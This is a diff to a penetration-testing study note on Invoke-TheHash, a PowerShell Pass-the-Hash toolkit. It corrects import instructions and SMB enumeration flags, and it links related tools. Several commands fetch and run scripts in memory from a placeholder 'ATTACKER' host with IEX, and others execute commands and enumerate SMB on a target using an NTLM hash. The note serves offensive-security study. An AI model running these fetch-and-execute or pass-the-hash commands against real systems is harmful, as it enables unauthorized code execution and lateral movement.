@@ -5,7 +5,7 @@
 PowerShell Pass-the-Hash toolkit for Windows-side lateral movement. Performs WMI and SMB command execution, SMB enumeration, and SMB file operations using NTLM hashes — no plaintext password required. Useful when you have a Windows foothold and need to move laterally without dropping Impacket tools.
 
 **Source:** https://github.com/Kevin-Robertson/Invoke-TheHash
-**Install:** `IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/Invoke-TheHash.psd1')`
+**Install:** `Import-Module .\Invoke-TheHash.psd1` from disk. In memory, dot-source each function file — you **cannot** `IEX` the `.psd1` (it's a manifest hashtable, not code): `IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/Invoke-WMIExec.ps1')` (repeat per function you need).
 
 ```powershell
 # Import module
@@ -20,11 +20,15 @@ Invoke-WMIExec -Target 192.168.1.10 -Domain DOMAIN -Username Administrator -Hash
 ## Import
 
 ```powershell
-# From disk
+# From disk (loads all functions)
 Import-Module .\Invoke-TheHash.psd1
 
-# In-memory (fileless)
-IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/Invoke-TheHash.ps1')
+# In-memory (fileless) — dot-source the individual function files.
+# The repo ships one .ps1 per function; there is no single combined script, and
+# the .psd1 manifest is NOT executable, so IEX only works on the function .ps1s.
+IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/Invoke-WMIExec.ps1')
+IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/Invoke-SMBExec.ps1')
+IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/Invoke-TheHash.ps1')   # multi-target wrapper
 ```
 
 ---
@@ -76,17 +80,19 @@ Invoke-SMBExec -Target 192.168.1.10 -Domain DOMAIN -Username Administrator \
 ## Invoke-SMBEnum — SMB Enumeration
 
 ```powershell
-# Enumerate users, groups, sessions, shares over SMB with hash
+# What to enumerate is selected with -Action (All,Group,NetSession,Share,User).
+# Default is Share — pass -Action explicitly for anything else.
 Invoke-SMBEnum -Target 192.168.1.10 -Domain DOMAIN -Username Administrator \
-  -Hash NTLMhash -Verbose
+  -Hash NTLMhash -Action All -Verbose
 
 # Enumerate specific items
 Invoke-SMBEnum -Target 192.168.1.10 -Domain DOMAIN -Username Administrator \
-  -Hash NTLMhash -Group            # groups only
+  -Hash NTLMhash -Action User           # users
 Invoke-SMBEnum -Target 192.168.1.10 -Domain DOMAIN -Username Administrator \
-  -Hash NTLMhash -User             # users only
+  -Hash NTLMhash -Action NetSession     # active sessions
+# -Action Group enumerates a group's members; -Group names which (default Administrators)
 Invoke-SMBEnum -Target 192.168.1.10 -Domain DOMAIN -Username Administrator \
-  -Hash NTLMhash -NetSession       # active sessions
+  -Hash NTLMhash -Action Group -Group "Domain Admins"
 ```
 
 ---
@@ -140,6 +146,10 @@ Invoke-TheHash -Type SMBExec -Target 192.168.1.0/24 \
 
 ---
 
+> [!note] **See also** — Linux/impacket equivalents of the same Pass-the-Hash execution: [[Tools/Lateral Movement/NetExec|NetExec]] (`-H`), [[Tools/Local System Management/wmiexec|wmiexec]], [[Tools/Lateral Movement/Evil WinRM|Evil WinRM]] (`-H`). Get the NT hash from [[Tools/Credential Dumping/mimikatz|mimikatz]]. PtH context and detection: [[Class notes/HTB Academy/CPTS v2 (claude)/Windows Priv Esc|Windows Priv Esc]], [[Standards & Protocols/NTLM|NTLM]] (why the hash alone authenticates).
+
+---
+
 *Created: 2026-03-06*
-*Updated: 2026-03-06*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-08-29*
+*Model: claude-opus-5*
